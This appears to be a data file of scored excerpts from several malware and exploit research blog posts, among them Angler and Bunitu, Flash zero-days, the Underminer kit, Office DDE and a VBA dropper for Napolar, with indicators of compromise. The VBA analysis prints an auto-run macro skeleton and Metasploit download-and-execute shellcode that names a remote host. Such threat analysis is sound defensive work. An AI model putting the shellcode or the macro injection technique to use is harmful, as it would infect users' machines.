<p>Since April we have seen compromised Revive Adserver scripts being used by several highly popular websites, including CNN Indonesia, Detik, Prague Airport, AASTOCKS, RTL Television Croatia, and the official Bejewled Blitz game on Facebook. Some of these only seem to contain the injected code for 24 hours, whilst others have remained compromised for weeks. Recently, we saw an interesting infection chain from the popular Croatian website&nbsp;<em>Forum[.]hr</em>&nbsp;(Alexa 15 in Croatia) which has been using a compromised Revive Adserver script from third-party advertiser&nbsp;<em>ads3.monitor[.]hr</em></p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/7sm5jqt.png"" style=""height:670px; width:1003px"" /></p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/w2mmvo9.png"" style=""height:427px; width:1106px"" /></p>
<p><em>Image 2, 3 &amp; 4.&nbsp;</em><em>A compromised advertizing script on&nbsp;ads3.monitor[.]hr&nbsp;displays a legitimate advert whilst malicious code executes in the background</em></p>
<p>The injected code led to a redirect, and then to Angler Exploit Kit which exploited the latest Adobe Flash Player vulnerability (CVE-2015-3090). Recently the exploit kit has been distributing CryptoWall 3.0, Bedep and Necurs but we saw a different payload, a trojan known as &#39;Bunitu&#39;.</p>
<h3>Bunitu Malware Turns Your Machine into a Zombie</h3>
<p>The Bunitu malware dropped by Angler caused our infected machine to act as a proxy, in theory allowing our computer&#39;s network connection to be used for subsequent malicious activity. Cybercriminals often use this tactic in order to hide their tracks from authorities, behind legitimate users&#39; machines. The SHA1 for the sample we saw is&nbsp;<em>004e9a3ea2670a76ee90067ff29816c31908e552</em>.</p>
<p>Bunitu drops and loads a DLL within its own process which opens two random ports on the infected machine for a SOCKS5 proxy and an HTTP proxy, and in our case these were ports 8322 &amp; 56100 respectively. It contains a hard-coded call home/command-and-control IP of&nbsp;<em>85.17.142[.]21:53</em>&nbsp;which it tries to contact twice in order to report our infection and which ports it has opened on our machine:</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/zi84cmm.png"" style=""height:317px; width:1141px"" /></p>
<p><em>Image 5. Bunitu calling home and reporting an infection, along with which proxy ports are opened on the infected machine</em></p>
<p>The malware also has back-up infrastructure in case the hard-coded call home server is not available. It attempts to resolve&nbsp;<em>nsb.quixjoumnf[.]com</em>, resulting in an IP of&nbsp;<em>110.201.214[.]114</em>. The hexadecimal value of this IP address is represented in memory as 0x72D6C96E, and Bunitu then XORs this value against a hard-coded value of 0x16EC1A31, resulting in 0x643AD35F. This final value is the hexadecimal representation of another IP,&nbsp;<em>95.211.58[.]100</em>&nbsp;which is used as a call home by Bunitu after the initial two attempts to the hard-coded server. This routine can be seen in the following image:</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/ftj4ufi.png"" style=""height:596px; width:1013px"" /></p>
<p><em>Image 6. Bunitu XOR routine for resolving IP addresses</em></p>
<p>There are also two more back-up addresses that Bunitu can resolve if&nbsp;<em>nsb.quixjoumnf[.]com</em>&nbsp;does not resolve; here is a representation of how the call home infrastructure is determined:</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/xjbgorj.png"" style=""height:86px; width:812px"" /></p>
<p>Bunitu regularly sends heartbeats to its C&amp;C so that it can be determined which machines are currently active and infected.</p>
<h3>Summary</h3>
<p>Advertising networks continue to be a point of focus for cybercriminals, opening up avenues to infect millions of users with minimal effort. The growing nature of evasion, stealth, and variation employed in the malicious code means that it&#39;s more important now than ever to deploy a security solution capable of stopping threats at multiple points in the&nbsp;<a href=""http://www.websense.com/content/seven-stages-recon.aspx?cmpid=slbl"" target=""_blank"">7 stages kill chain</a>.</p>
<h3>Appendix</h3>
<p>Indicators of compromise can be found below.</p>
<p><strong>Payloads (SHA1)</strong></p>
<p>SWF Exploit: <em>feb33f3a3ac53203697d2b04ddbefa038b199a21</em></p>
<p>Bunitu EXE:&nbsp; <em>004e9a3ea2670a76ee90067ff29816c31908e552</em></p>
<p>Bunitu DLL:&nbsp; <em>fc512fc9ad3501aecf8fab06d2c76447879520d0</em></p>
<p><strong>Command-and-Control</strong></p>
<p><em>nsb.quixjoumnf[.]com</em></p>
<p><em>ns1</em><em>.quixjoumnf[.]com</em></p>
<p><em>ns0</em><em>.quixjoumnf[.]com</em></p>
<p><em>85.17.142[.]21:53</em></p>
<p><em>95.211.58[.]100:53</em></p>
<p><em>95.211.233[.]121:53</em></p>
<p><em>46.183.216[.]247:53</em></p>
",0.021835905929932675
"New Flash Player zero-day comes inside Office document
Update (2018-02-06): Adobe has released a patch for this vulnerability. More information is available here.
We tested this zero-day with a proof-of concept that was made available. Rather than launching it from within Office, we turned it into a drive-by download attack. The animation below shows Malwarebytes blocking the exploit, and when the anti-exploit protection module is disabled, we can see the calculator launching.",0.008673557820523703
"– –
A new Flash Player zero-day has been found in recent targeted attacks, as reported by KrCERT. The flaw, which exists in Flash Player 28.0.0.137 and earlier versions, allows an attacker to remotely execute malicious code. On February 1, Adobe published a security advisory acknowledging this zero-day:
Adobe is aware of a report that an exploit for CVE-2018-4878 exists in the wild, and is being used in limited, targeted attacks against Windows users. These attacks leverage Office documents with embedded malicious Flash content distributed via email.
Threat actors used a decoy Microsoft Excel document to lure their intended target (some South Korea users) in order to infect them with a remote administration tool named ROKRAT. While not obvious at first, an ActiveX object has been embedded into the document and contains the Flash exploit. Highlighting cells reveals a small white rectangle that represents the embedded object:",0.013410719761356327
"Upon opening the spreadsheet, one of several South Korean websites will be contacted via a GET request containing the following three parameters:",0.013540134760634315
"a unique identifier
the Flash Player version
the Operating System version",0.010450721527291651
This is an important step because it retrieves a key used to decrypt the malicious shell code.,0.013075660717943083
"By the time we had access to this sample, the websites hosting it were down, which proved to be a showstopper in the exploitation and payload. Malwarebytes detects the remote administration tool that was dropped, as well as blocks the sites known to have hosted the key and payload.",0.014312625559314562
"Adobe has said it will issue a patch for this zero-day sometime during the week of February 5. In the meantime, users are advised to disable or uninstall the Flash Player. We expect that this exploit will be used in larger scale attacks, including via malicious spam. We will keep you updated of any further developments.
Indicators of compromise
1588-2040.co[.]kr/design/m/images/image/image.php?
dylboiler.co[.]kr
SWF exploit
FEC71B8479F3A416FA58580AE76A8C731C2294C24663C601A1267E0E5C2678A0
",0.01210915115951472
"Underminer exploit kit improves in its latest iteration
One of the most interesting exploit kits we track is also a bit of an elusive one, and as such does not receive the same scrutiny as its RIG and Fallout counterparts. Underminer was mentioned in our Fall 2018 round up, and at the time was using CVE-2018-8174 (Internet Explorer) and CVE-2018-4878 (Flash Player up to version 28.0.0.137).
In mid-December, we noticed some changes with Underminer that prompted us to take a deeper look. This happened around the same time frame as new zero-days and proof of concepts were available, which is typically an opportune moment for exploit kit authors to integrate.
Previous version and artifacts
The CVE-2018-4878 vulnerability is somewhat easy to spot within network traffic because it leaves some artifacts behind. Indeed, we use these in our lab and correlate them with other IOCs.
Traffic view of Underminer EK in November, showing CVE-20184878 artifacts
As documented in our previous blog post, Underminer uses client-server key exchange when it delivers its IE exploit, which encrypts the code but also prevents analysts from replaying it from a saved network capture. However, its SWF exploit up until now was deployed without such protections in place and could therefore be re-analyzed on its own.
New covert Flash exploit
The exploit appears to have changed as of mid-December. First, we did not see the Flash artifacts as we did before, which prompted us to test this exploit with a more recent version of Flash instead (31.0.0.153).
Traffic view of the latest Underminer EK using a different Flash exploit implementation
Second, we saw a new snippet of code within the SWF exploit landing page referencing a getSalt() function. This stoked our curiosity, and as we compared various traffic captures, we noticed that the function would always return different values.
Looking at the SWF exploit itself, we saw code that interacts with the launcher page’s JavaScript (ExternalInterface.call) and grabs that value in order to pass it to another function that decodes the exploit. When we attempted to replay the malicious SWF “artificially,” it would not fire properly.
Malwarebytes Anti-Exploit triggering with Flash Player 31.0.0.153
Because the version of Flash we used was 31.0.0.153 (the latest Flash Player was not affected in our tests), we believe Underminer implemented the recent CVE-2018-15982.
The way the final payload is packaged and executed remains unique to Underminer. It’s what we call Hidden Bee. Hidden Bee is a custom payload that has specific modules and lacks the structure of the typical PE format. For this reason, it is more difficult to analyze and gives the attackers more flexibility than if they were using simple shellcode instead.
Malwarebytes users are already protected against this exploit kit, as we block both the Internet Explorer and Flash Player exploits.
Indicators of compromise (IOCs)
Underminer IP:
98.126.222[.]187
Flash exploit
d75710ebc8516e73e3a8dd7d1ad1ebc3221b7a141659c7e84b9f5f97dd7ec09e
Custom payload
5574f4b0b507130db06072930016ed5d2ef79aaa1262faddfdb88891c1599672
",0.01683973725147525
PRODUCTS & SERVICES,0.010734820384793453
Microsoft Office DDE zero-day: are you protected?,0.012054182576777928
Microsoft Office DDE zero-day enables attacks without using macros.,0.01383752835888652
"Written by
Bill Brenner",0.008906235048519173
"October 13, 2017",0.009865791256957634
Malware Network Security Products Threat Research Exploit Intercept X Microsoft Office DDE,0.009424705682645862
"It’s been a busy week in the world of Microsoft Office security risks. Tuesday, the software giant released a patch for CVE-2017-11826, a remote code execution (RCE) vulnerability attackers could exploit to run malware delivered to victims via phishing attachments.
Now comes word of a zero-day vulnerability in Microsoft’s Dynamic Data Exchange (DDE) protocol — which sends messages and shares data between applications. Applications, for example, can use DDE for one-time data transfers and for continuous exchanges where apps send updates to each another as new bits are available.
Sophos researcher Mark Loman says it’s significant because attackers could exploit it to run malware without using macros. He adds:",0.014166084343904317
"Microsoft says DDE is legitimate feature since 1993, but since its reveal this week, many attackers are leveraging the trick to deploy remote-access Trojans (RATs).",0.011624069270913306
"There’s no word yet on when — or if — Microsoft will develop a patch.
For now, Sophos Intercept X customers are protected. Loman has created the following video showing how Intercept X stops attacks using the DDE zero-day:",0.012532199331590332
"For Office threats in general, here’s the advice we typically give:",0.013729209619236404
"If you receive a Word document by email and you aren’t expecting it or don’t know the person who sent it, it’s better to leave it unopened.
Use an anti-virus with an on-access scanner (also known as real-time protection). This can help you block malware of this type in a multi-layered defense.
Consider stricter email gateway settings. Some staff are more exposed to malware-sending crooks than others (such as the order processing department), and may benefit from more stringent precautions, rather than being inconvenienced by them.
Never turn off security features because an email or document says so. Documents such as invoices, courier advisories and job applications should be legible without macros enabled.",0.014378483830021604
DEEP LEARNING FOR DEEPER CYBERSECURITY  Watch Video,0.011176153783902576
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"4
",0.008739321216238327
"There’s Passwording and there’s Security
Kim Zetter’s article for Wired tells us that “SCADA System’s Hard-Coded Password Circulated Online for Years” – see the article at http://www.wired.com/threatlevel/2010/07/siemens-scada/#ixzz0uFbTTpM0 for a classic description of how a password can have little or no value as a security measure. Zetter quotes Lenny Zeltser of SANS as saying that ““…anti-virus tools’ ability to detect generic versions of",0.009134244457818963
20 Jul 2010 - 11:36AM,0.011064124463555536
Kim Zetter’s article for Wired tells us that “SCADA System’s Hard-Coded Password Circulated Online for Years” – see the article at http://www.wired.com/threatlevel/2010/07/siemens-scada/#ixzz0uFbTTpM0 for a classic description of how a password can have little or no value as a security measure. Zetter quotes Lenny Zeltser of SANS as saying that ““…anti-virus tools’ ability to detect generic versions of,0.009246174125843054
Kim Zetter’s article for Wired tells us that “SCADA System’s Hard-Coded Password Circulated Online for Years” – see the article at http://www.wired.com/threatlevel/2010/07/siemens-scada/#ixzz0uFbTTpM0 for a classic description of how a password can have little or no value as a security measure.,0.01080515156673545
"Zetter quotes Lenny Zeltser of SANS as saying that ““…anti-virus tools’ ability to detect generic versions of the exploit have not been very effective so far.” We now detect it as LNK/Exploit.CVE-2010-2568, but our lab will be delighted to improve the detection if SANS has a sample we don’t detect. ;-)",0.010041508312373382
"Costin Raiu, however, has an interesting take on the code signing issue that Pierre-Marc flagged here yesterday, suggesting that JMicron and Realtek might both have been infected by a malware such as Zbot (Zeus) that steals digital certificates.",0.014181336606557848
"I had an interesting chat this morning with Jeremy Kirk of IDG, but that’s an angle that hadn’t occurred to me. Jeremy’s article “Eset Discovers Second Variation of Stuxnet Worm” is here.",0.012278606182807739
"Dan Raywood of SC Magazine also looked at the issue here and quoted my earlier blog, And Jim Finkle of Reuters quoted Siemans, Microsoft, and our own Randy Abrams here. Randy was also quoted by Richard Adhikari in a TechWorld article here.",0.012179852222122256
Hat tip also to Bob McMillan for pointing me to the US-CERT advisory at http://www.us-cert.gov/control_systems/pdf/ICSA-10-201-01%20-%20USB%20Malware%20Targeting%20Siemens%20Control%20Software.pdf,0.016112294286737328
"David Harley CITP FBCS CISSP
ESET Senior Research Fellow
",0.011179100245160778
"Recently, cybercriminals launched yet another massive spam campaign, this time impersonating the Internal Revenue Service (IRS) in an attempt to trick tax payers into clicking on a link pointing to a bogus Microsoft Word Document. Once the user clicks on it, they are redirected to a Black Hole exploit kit landing URL, where they’re exposed to the client-side exploits served by the kit.
More details:",0.01289789131129293
Screenshot of the spamvertised IRS themed email:,0.009200278008096752
"Once the user clicks on the link pointing to a Black Hole landing URL, he’s exposed to the following bogus “Page loading…” page:",0.012370716296328688
"Spamvertised URLs: hxxp://tiraccontolamusica.it/reves.html; hxxp://marcina.pl//reves.html; hxxp://juegosinternet.org/reves.html; hxxp://breastenlargementratings.com/reves.html
Client-side exploits serving URL: hxxp://retweetadministrator.org/main.php?page=8b45f871830c6e5a
Client-side exploits served: CVE-2010-0188; CVE-2010-1885
Detection rate for a sample redirection script: MD5: 1ab7543c3c7857eec5014b3de5da362e detected by 3 out of 41 antivirus scanners as JS/Iframe.W!tr; Trojan-Downloader.JS.Iframe.czj.
Upon successful client-side exploitation, the campaign drops MD5: 6d7b7d2409626f2c8c166373e5ef76a5 on the affected hosts, currently detected by 30 out of 41 antivirus scanners as Trojan-Ransom.Win32.Gimemo.akxc
Also, as you can see in the first screenshot, the cybercriminals behind the campaign didn’t bother to use the services of a “cultural diversity on demand” underground market proposition offering the ability to localize a message or a web site to the native language of the prospective victim, hence they failed to properly formulate their sentence, thereby raising suspicion in the eyes of the prospective victim.
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010848694837019002
Microsoft pushes patch to prevent ‘WannaCry level’ vulnerability,0.007893216102691891
"This month marks the two-year anniversary since the infamous WannaCry attack. As an anniversary present to the world, Microsoft has pushed out patches to secure a newly-identified Remote Desktop Protocol (RDP) vulnerability found in certain Windows operating systems.
The potential damage of the newly-discovered RDP vulnerability matches the same dangers we experienced with the WannaCry ransomware, a malware that utilized weaponized vulnerabilities to infect systems across the globe, basically acting as a worm. This same RDP vulnerability allows attackers to execute code on the targeted system without needing to infect the system first.
So, worst-case-scenario? A WannaCry wannabe will quickly spread malware across the world, exploiting vulnerable systems and sending everyone into a panic.",0.010434267484530357
"How to patch the vulnerability
So how do you fix this? Luckily, Microsoft has released patches for vulnerable operating systems, which includes most operating systems pre-Windows 8:",0.014196045090330789
"Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for Itanium-Based Systems Service Pack
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows XP SP3 x86
Windows XP Professional x64 Edition SP2
Windows XP Embedded SP3 x86
Windows Server 2003 SP2 x86
Windows Server 2003 x64 Edition SP2",0.03823531230346666
"Anyone who is running Windows 8, 10, or any of the modern Windows Server operating systems is not vulnerable to this threat.
If you have one of the aforementioned operating systems currently running and connected to the Internet, you’ll need to update as soon as possible. Not all of these operating systems are out of support for Microsoft, and those who have automatic updates should be fine and patched already.
However, if you are unable to enable automatic updates, or you are still running Windows XP and/or Windows Server 2003, you’ll need to download the patch and manually execute it.
For those of you who need to update manually, just click on the operating system you are working with and you’ll be navigated to the Microsoft patch download page, which has the patches you need to download.",0.009711531138225649
"🚨 Very important security update for Windows 🚨 CVE-2018-0708 allows remote, unauthenticated code execution is RDP (Remote Desktop). A very bad thing you should patch against. Around 3 million RDP endpoints are directly exposed to internet. https://t.co/EAdg3VNMjw pic.twitter.com/u2V3uyoyVs— Kevin Beaumont 🌈 (@GossiTheDog) May 14, 2019
Security researcher Kevin Beaumont identified millions of vulnerable systems on Shodan.io.
Learning from history
RDP has historically been an avenue for attackers attempting to break into systems and/or drop malware, but we’ve noticed an uptick in RDP attacks against businesses over the last year. With that in mind, even after patching, you should consider checking out our guide on how to protect RDP from ransomware attacks.
The incident with WannaCry in 2017 has forever changed the perception of how to launch an effective attack against a large portion of the world. We’ve observed exploits used by this threat in modern commercial malware, such as Emotet and TrickBot.
It would not be out of the realm of possibility that within the next few weeks, this vulnerability will be weaponized and used against consumers and businesses who fail to patch and protect their networks. Don’t be a statistic. Protect your machines, data, networks, and users right now.
",0.010533236407392788
"Java the Hutt meets CVE‑2012‑1723: the Evil Empire strikes back
The Java exploit for CVE-2012-1723 is already included in the latest update of the BlackHole exploit kit.",0.01244258856708591
10 Jul 2012 - 12:13PM,0.011170722608707995
The Java exploit for CVE-2012-1723 is already included in the latest update of the BlackHole exploit kit.,0.01156596572883195
"In one of my previous posts I described how the CVE-2012-1889 vulnerability (CVE2012-1889: MSXML use-after-free vulnerability) works, but the Java exploitation process is too easy for the bad guys not to revisit it. The attacker does not have to think about problems with ASLR/DEP, SafeSEH and other security mechanisms included in the latest versions of Microsoft Windows. All the tricks for bypassing security mechanisms make the exploitation process more unstable and are not universal across platforms.",0.01171278444937307
[heap-spray results from JS/Exploit.CVE-2012-1889],0.0074896604748140305
"Previous, the Java vulnerability most commonly used for mass exploitation in popular exploit kits was CVE-2012-0507 (Blackhole, CVE-2012-0507 and Carberp). This vulnerability uses a logical bug in AtomicReferenceArray by using the Unsafe class to store a reference in an array directly, which may violate type safety if not used properly.",0.011233235180686973
"CVE-2012-1723 is an interesting vulnerability, based on a bug in the Java HotSpot VM with the bytecode verifier where an invalid optimization of GETFIELD/PUTFIELD/GETSTATIC/PUTSTATIC instructions leads to insufficient type checking. The vulnerability allows malware a way to evade the JRE (Java Runtime Environment) sandbox, so that it can load additional java classes in order to perform malicious actions. CVE-2012-1723 is a cross-platform vulnerability and can be used to attack all platforms with an actual JVM (Java Virtual Machine) version. In the cases of both CVE-2012-0507 and CVE-2012-1723 the vulnerabilities were made public by Michael ‘mihi’ Schierl. These vulnerabilities are of a similar nature, using bugs in the  logic of JVM components in order to work. Today, CVE-2012-1723 multiplatform exploitation code was made public by publishing it in the Metasploit Framework repository (java_verifier_field_access.rb). ESET products already detect the CVE-2012-1723 vulnerability as JS/Exploit.CVE-2012-1723.",0.009423332109092408
"The exploit for CVE-2012-1723 (New Java Exploit to Debut in BlackHole Exploit Kits) is already included in the latest update of the BlackHole exploit kit. It has already ceased to be a zero-day vulnerability, but in practice Java exploits constitute a large percentage of successful attacks even after a patch has been released. BlackHole is now the most common exploit kit, and a license for one year with support costs $1,500 on the cyber crime marketplace.",0.013943743313098889
The exploitation code packs the following object structure into  a JAR (Java archive file):,0.0073236110635689355
"So as to provide execution of a malicious payload, an additional 100 static fields in class C2 were crafted and assigned a NULL value. At the next stage of exploitation another 100 instances of class C3 non-static confuse methods are generated. This operation looks like this in java bytecode:",0.009717063282682736
At the next step of exploitation the confuse method is called many times and results in the  execution of malicious code. This code executes by loader class and provides additional classes loading in an escalated privilege context and performing operations that enable evasion of the sandbox mechanism.,0.011191012484567442
When the Java code is decompiled these operations look like this:,0.007923332402766659
At the final stage of exploitation a new application domain is built which executes outside the sandbox and runs a malicious java applet without security checks.,0.013997117977160078
"The Java platform is particularly interesting to attackers at this moment because vulnerabilities are continually being found, and exploitation looks easier than exploitation of native, platform-specific applications where operating system security mechanisms may get in their way. A working exploit for a known Java vulnerability may take a few days to develop, whereas it may take a few weeks to develop exploitation code for a native application.
Aleksandr Matrosov, Security Intelligence Team Lead
",0.011214343474094557
"Angler EK Drops TeslaCrypt Via Recent Flash Exploit
On December 18, security company Fortinet blogged about a possible new variant of the CryptoWall ransomware distributed via spam. Around the same time we discovered that the Angler exploit kit was also pushing this new ‘variant’. However it is not CryptoWall (thanks Yonathan Klijnsma for the tip) but rather TeslaCrypt.
Files are encrypted and appended with a .vvv extension. In order to recover those files, victims must pay $500USD or face the risk of seeing this amount double within less than a week.
Your files are encrypted.
To get the key to decrypt files you have to pay 500 USD. If payment is not made before 25/12/15 the cost of decrypting files will increase 2 times and will be 1000 USD
Angler EK uses a very recently patched flaw in Adobe Flash Player up to version 19.0.0.245 (CVE-2015-8446), making it the most lethal exploit kit at the moment.",0.016146405083832915
Ransomware is one of the most prolific and devastating pieces of malware users have had to deal with in recent years.,0.017488637925252015
"Malwarebytes Anti-Exploit blocks this particular attack via Angler while Malwarebytes Anti-Malware detects the malware binary (VT 2/55).
",0.016884806448261958
"Back to VBA
2014-04-02",0.012031516184513147
"Gabor Szappanos
Sophos
,
Hungary
Editor:
Helen",0.00889288739339722
"Martin
Abstract
Last month’s issue of Virus Bulletin featured a detailed analysis of the Polarbot (a.k.a. Solarbot) trojan. The article covered just about everything you could ever want to know about it – except for one thing: how does a computer end up being infected with this creation? Gabor Szappanos fills the gap by detailing one of the infiltration methods that was used extensively in the attack.
Copyright © 2014 Virus Bulletin",0.010985742148826416
"A VBA macro code that is a process injector, a downloader shellcode and an AutoIt process injector script makes a very bizarre and eclectic combination. This is exactly what we observed being used in an attack during the last quarter of 2013. Add to the mix the fact that the final payload is the infamous Napolar, and we have a truly dazzling constellation.
Last month’s issue of Virus Bulletin featured a detailed analysis of the Napolar (a.k.a. Polarbot/Solarbot) trojan [1]. The article covered just about everything you could ever want to know about it – except for one thing: how does a computer end up being infected with this creation? This article attempts to fill in the gap, detailing one of the infiltration methods that was used extensively in the attack.
It is not unusual nowadays for Word documents to be utilized in attack scenarios to infect users. In fact, this is becoming increasingly common, as not only are APT groups using this method, but traditional cybercriminals have also discovered the advantages of it – for example, for deploying Zbot variants [2]. However, we have to travel several years back in time to find an ancient (and for all I knew, extinct) infection method in which a VBA macro was used instead of one of the popular Office exploits such as CVE-2012-0158.
The infection scheme is summarized in Figure 1, and will be described in more detail in the following sections.
Figure 1. Overview of infection method.",0.01418842045599078
"Infection process
In the infection wave that we are concerned with, the malware was distributed in the old-fashioned way: by email.
The messages used social engineering techniques in order to deceive the recipient – such as the one shown in Figure 2.
Figure 2. Email using social engineering.
Masquerading as an official message from a bank, the user is lured into opening the email attachment, which turns out to be a malicious Word document containing VBA macro code.
The macro code, which is designed for automatic execution on opening, has the following structure:
#If VBA7 Then
Private Declare PtrSafe Function CreateThread Lib “kernel32” (ByVal Lddqck As Long, ByVal Sxk As Long, ByVal Lssjnytp As LongPtr,
Ordq As Long, ByVal Jwnefbq As Long, Haeya As Long) As LongPtr
...
#Else
Private Declare Function CreateThread Lib “kernel32” (ByVal Lddqck As Long, ByVal Sxk As Long, ByVal Lssjnytp As Long, Ordq As
Long, ByVal Jwnefbq As Long, Haeya As Long) As Long
...
#End If
Sub Auto_Open()
Dim Zjd As Long, Afaezkmrg As Variant, Bwqbj As Long
#If VBA7 Then
Dim Zqinobi As LongPtr, Nfqzstrhn As LongPtr
#Else
Dim Zqinobi As Long, Nfqzstrhn As Long
#End If
...
End Sub
Sub AutoOpen()
Auto_Open
End Sub
Sub Workbook_Open()
Auto_Open
End Sub",0.014947704429402187
"The ‘#If’ structure in the heading makes sure that the code works on both 64-bit and 32-bit installations. The main code is in the Auto_Open() function, which is invoked by the two event handler functions: AutoOpen and Workbook_Open. This ensures that the code is executed whenever the document is opened. Even though this is cross-application code, and Workbook_Open could make it work in Excel, we have not observed any Excel workbooks in the distribution campaign. Nevertheless, the Workbook_Open stub remains in the code – which is probably due to the malware authors being too lazy to clean up the proof-of-concept code they used as ‘inspiration’.
Visual Basic for Applications (VBA) is the macro programming environment of Microsoft Office applications. Although the Basic language has a bad reputation, this is quite a capable programming language – as has been well demonstrated by macro viruses in their prime and now by this malware.
There is an additional difficulty that comes from using a VBA macro as an infection vector instead of an exploit: from Office 2007 onwards, the execution of VBA macros is disabled by default (if only this had happened 10 years and four Office versions earlier, it would have changed the macro virus game completely!). The result is that, despite having an autostart macro, the VBA code will not execute in the newer versions of Office – furthermore, an alert is displayed on the Word menu bar which warns about the disabled macros, as shown in Figure 3.
Figure 3. ‘Macros disabled’ warning.
However, the malware authors were prepared for this situation, and deployed another simple social engineering trick to overcome it.
The document displays a blurred account statement, and an explanation that the content has been obscured due to the security settings. Helpfully, an arrow points to the status bar at the top of the window, where the security warning about the macros is displayed, and where clicking on the ‘Options’ button will reveal the option to enable macros.
This lures the user – who, thanks to the social engineering, is eager to see the blurred account information – to enable the execution of macros.
Figure 4. Luring the user into enabling macro execution.
Having done that, the VBA code will be executed the next time the document is opened.
The VBA code then builds a shellcode in an array, which is moved to a newly allocated memory area with a call to RtlMoveMemory. Finally, a new thread is created on this code by a call to CreateThread.
Figure 5. Shellcode injection implemented in VBA.
(Click here to view a larger version of Figure 5.)
The shellcode itself is the standard download-and-execute payload generated by the Metasploit framework, a snippet of which is shown in the following listing:
push  0E2899612h ; InternetReadFile
call  ebp
test  eax, eax
jz    short loc_195
pop   eax
test  eax, eax
jz    short loc_183
push  0
push  esp
push  eax
lea   eax, [esp+0Ch]
push  eax
push  ebx
push  5BAE572Dh ; WriteFile
call  ebp
sub   esp, 4
jmp   short loc_151
push  ebx
loc_184:          ; CloseHandle
push  528796C6h
call  ebp
push  0
push  edi
push  876F8B31h  ; WinExec
call  ebp
loc_195:
push  0
push  0A2A1DE0h
call  ebp
call  loc_133
aRund11_exe  db ‘rund11.exe’,0
loc_1AE:
call  loc_B3
aCarpentercommu  db ‘carpentercommunities.com’,0",0.01749247962435796
"The technique described in the preceding paragraphs is a very creative way of using macro programming (and lies very far from its original purpose – the automation of tedious text editing operations), but it is far from being original. In fact, the macro code used by the malware authors is an exact copy of the proof-of-concept code taken from [3].
The variables used in the code have been replaced with random names, but that is a standard code re factoring practice in the malware development world.
The only notable difference is the shellcode, which in the case of the PoC was a standard Metasploit payload that executed calc.exe – in the observed samples, this was replaced with another standard Metasploit shellcode that downloads and executes an EXE file from a specified URL.
It is worth noting that the original idea of using VBA for process injection was first published by Didier Stevens in his blog [4]. He used a different approach, utilizing WriteProcessMemory and CreateThread, and the shellcode was also different.
Altogether, about a dozen Word dropper samples were identified over the duration of the campaign. Additionally, a few other samples showed up using the same shellcode injection technique – however, these came from malware research labs, probably as a result of researchers playing with the code to try to understand its operation. The latter samples are omitted from Table 1, which summarizes the main characteristics of the samples.
First seen
SHA1
Attachment name
Downloaded URL
16/08/2013
202985b9fdd9d147341e25540dfdb243bd306b95
N/A
autotema11.ru/serv/Junior.exe
18/08/2013
5825cd3ef26235d76b1f93355b2990ec37528a7a
N/A
autotema11.ru/server/jSolar.exe
21/08/2013
ef698a24f3ee89b76433ffdee878d9ff92c04d45
entity1.doc
carpentercommunities.com/serve/crypsola.exe
22/08/2013
958ce870117af6269ee9d45bb64188e1fa99fb5d
New bill payment.doc
autotema11.ru/server/solarju.exe
03/09/2013
15783a1eb0c1b5d56ac5cefcfd89f7bcd68cd6b9
N/A
kasvatus.org/serve/solair.exe
09/09/2013
62e9b795d6ff189d0f712626397ef0ff0fbf2f52
N/A
kasvatus.org/serve/crypsola.exe
12/09/2013
25ee9e4d8f11059de5f4a438744d677ca60c73dd
IATA_Original_Account_form.doc
kasvatus.org/serve/crypsoliar.exe
15/09/2013
183704daabdf93c8bdcc2d65a28c3f5fa32e041e
IATA_original_paymen
kasvatus.org/serve/crysol.exe
03/10/2013
8f599386ede0ff711f3aae6c3d4e8da2abf7b4c0
Your_Bank_Account_Overview.doc
webservice.cl/files/IE_Monitor.exe
07/10/2013
90ac1f4b23b81c5697e19217bc7a4472fc54a2d3
IATA_Original_Paymen
webservice.cl/files/IE_Monitor.exe
09/10/2013
ca7bc0d21d66a72ea80d693dd3b097e7a35b2110
Your_Bank_Account_Overview.doc
webservice.cl/files/Process.exe
14/10/2013
f5cb147f47248f7ab24ea9ae66ad7ec94340c4d3
Your_Bank_Account_Overview.doc
dopline.ru/js_file/Process.exe
15/10/2013
3ccd9c44b98fec8064b7dea6e38743394ddc839d
Profoma+Invoice.doc
webservice.cl/files/updater.exe
21/10/2013
39c4cf87b32feb929272746667aff96fd282b864
Account_History_Overview.doc
dopline.ru/js_file/IE_Explorer.exe
28/11/2013
40f30a18fb8067cc617d7b55fe194011e43cac69
N/A
sunshineyogafitness.com/development/juni-crypt.exe
Table 1. Dropper documents identified in the campaign.
The first-seen date of the individual samples shows that the campaign was running in the August–October timeframe, with regular, and more or less evenly distributed releases of new variants.
Every Word document contains additional information, besides the document text – and the malicious documents in our investigation were no exception. The most important part of this additional data was the name of the user who last saved the document (see Figure 6).
Figure 6. Author name in the properties.
It is worth remembering the two user names that were observed in the documents: Johntab and Johntab-PC, because this is not the last time we will see them.
Each of the samples downloaded an executable from a specified URL. There was very little overlap between the links, with only one recurrence observed. On the other hand, in many cases the same server was used with different filenames.
Unfortunately, we were only able to retrieve a handful of downloaded executables for analysis, as the URLs were usually very short-lived.
The live downloads yielded the following files:
37f6e5ba7ed966228e79036698419a78a9583b62:
crypsola.exe
c72d5c35ea8aaa366b457e622ab235641c06376a:
IE_Explorer.exe
14de27f59db24219073feb546f161a179d013dfd:
Process.exe
ece7650ad323706c3a3dfcfe539a25ded53ab3e7:
crypsoliar.exe
Looking at them more closely led to the next surprise: each of them was a heavily obfuscated AutoIt script compiled into a standalone executable created with the purpose of decoding and executing the final payload, which turned out to be a Napolar bot.",0.01254453282882384
"IE_Explorer.exe and Process.exe
